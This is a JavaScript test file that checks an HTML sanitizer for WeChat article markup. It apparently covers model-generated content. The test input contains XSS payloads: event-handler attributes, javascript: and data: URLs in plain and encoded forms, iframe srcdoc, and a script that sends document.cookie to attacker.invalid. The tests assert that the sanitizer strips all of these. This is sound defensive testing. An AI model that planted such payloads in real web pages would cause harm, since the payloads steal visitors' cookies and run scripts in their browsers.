import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { sanitizeGzhHtml } from "../services/gzh.js";
import { validateGzhHtml } from "../services/gzhValidate.js";

const hostile = `
  <section id="escape" onclick="alert(1)"
    style="margin:0 auto;color:#334155;background-image:url(javascript:alert(1));position:fixed">
    <span leaf="" onmouseover="steal()">安全正文</span>
    <script>window.location='https://attacker.invalid/?cookie='+document.cookie</script>
    <img src="data:text/html,<script>alert(1)</script>" onerror="alert(1)" style="max-width:100%;height:auto">
    <img src="https://tracker.attacker.invalid/pixel.png" alt="tracking pixel">
    <a href="java&#x73;cript:alert(1)" style="color:#059669">危险链接</a>
    <a href="https://example.com/article" style="color:#059669">合法链接</a>
    <svg viewBox="0 0 10 10" onload="alert(1)"><path d="M0 0L10 10" stroke="url(https://attacker.invalid/x)" /></svg>
    <iframe srcdoc="<script>alert(1)</script>"></iframe>
  </section>`;

const clean = sanitizeGzhHtml(hostile);
assert.doesNotMatch(clean, /<script|<iframe|\son[a-z]+\s*=|javascript\s*:|data\s*:|url\s*\(/i);
assert.doesNotMatch(clean, /<img[^>]*\ssrc\s*=/i, "model-authored images must not make browser network requests");
assert.doesNotMatch(clean, /\s(?:id|class)\s*=/i);
assert.match(clean, /style="margin:0 auto;color:#334155"/);
assert.match(clean, /<span leaf="">安全正文<\/span>/);
assert.match(clean, /<a href="https:\/\/example\.com\/article" style="color:#059669">合法链接<\/a>/);
assert.match(clean, /<svg viewBox="0 0 10 10">/);
assert.doesNotMatch(clean, /stroke=/);

const encodedAndEscaped = sanitizeGzhHtml(`
  <section style="padding:16px;background:u\\72l(https://attacker.invalid/a.png);color:&#x75;rl(javascript:alert(1));box-shadow:image-set('https://attacker.invalid/b.png' 1x);font-size:16px">
    <span leaf="">正常内容</span>
    <img src="jav&amp;#x61;script:alert(1)" onerror=alert(1)>
  </section>`);
assert.doesNotMatch(encodedAndEscaped, /url\s*\(|javascript\s*:|onerror/i);
assert.match(encodedAndEscaped, /style="padding:16px;font-size:16px"/);

const validThemeHtml = sanitizeGzhHtml(
  '<section style="max-width:677px;margin:0 auto;background:linear-gradient(135deg,#ffffff 0%,#f8fafc 100%);display:flex;gap:12px;position:relative;overflow-x:hidden"><p style="font-size:16px;line-height:1.8;text-shadow:1px 1px #eee"><span leaf="">正常排版内容</span></p></section>'
);
assert.match(validThemeHtml, /linear-gradient/);
assert.match(validThemeHtml, /display:flex/);
assert.match(validThemeHtml, /gap:12px/);
assert.match(validThemeHtml, /position:relative/);
assert.equal(validateGzhHtml(validThemeHtml).errors.length, 0);

const graphiteTheme = readFileSync(
  new URL("../../assets/gzh/theme-graphite-minimal.md", import.meta.url),
  "utf8"
);
const realThemeBlock = graphiteTheme.match(/```html\s*([\s\S]*?position:relative[\s\S]*?)```/)?.[1];
assert.ok(realThemeBlock, "the bundled theme fixture must contain its relative-position component");
const sanitizedThemeBlock = sanitizeGzhHtml(realThemeBlock);
assert.match(sanitizedThemeBlock, /position:relative/);
assert.match(sanitizedThemeBlock, /border-bottom:1px solid #E4E4E7/);
assert.doesNotMatch(sanitizedThemeBlock, /\s(?:class|id|on[a-z]+)\s*=/i);

console.log("WeChat HTML allowlist security tests passed.");
